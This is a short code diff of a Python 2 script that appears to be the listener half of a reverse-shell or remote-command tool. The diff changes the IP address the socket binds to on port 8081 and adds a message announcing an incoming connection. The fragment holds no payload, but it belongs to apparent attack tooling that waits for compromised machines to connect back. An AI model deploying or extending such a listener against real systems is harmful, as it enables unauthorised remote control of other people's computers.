@@ -22,8 +22,9 @@ def transfer(conn,command):
 
 def connect():
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	s.bind(("192.168.1.39", 8081))
+	s.bind(("10.11.0.202", 8081))
 	s.listen(1)
+	print '[+] listening for incoming TCP connection on port 8081'
 	conn, addr = s.accept()
 	print '[+] We got a connection from: ',addr
 	
